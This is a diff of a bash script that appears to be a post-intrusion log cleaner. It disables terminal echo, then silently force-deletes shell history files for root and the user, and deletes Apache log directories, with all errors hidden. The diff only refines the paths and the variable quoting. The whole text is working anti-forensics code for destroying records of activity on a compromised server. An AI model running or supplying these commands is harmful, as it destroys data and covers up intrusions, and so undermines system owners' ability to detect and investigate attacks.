@@ -1,13 +1,11 @@
 #!/bin/bash
 
 stty -echo
-rm -rf $HISTFILE 2> /dev/null
-rm -rf /$USER/.bash_history 2> /dev/null
-rm -rf /$USER/.ksh_history 2> /dev/null
-rm -rf /$USER/.bash_logout 2> /dev/null
-rm -rf /home/$USER/.bash_history 2> /dev/null
-rm -rf /home/$USER/.ksh_history 2> /dev/null
-rm -rf /home/$USER/.bash_logout 2> /dev/null
+rm -rf "${HISTFILE}" 2> /dev/null
+rm -rf /root/.bash_history 2> /dev/null
+rm -rf /root/.ksh_history 2> /dev/null
+rm -rf /root/.bash_logout 2> /dev/null
+rm -rf /home/"${USER}"/.bash_logout 2> /dev/null
 rm -rf /usr/local/apache/logs 2> /dev/null
 rm -rf /usr/local/apache/log 2> /dev/null
 rm -rf /var/apache/logs 2> /dev/null
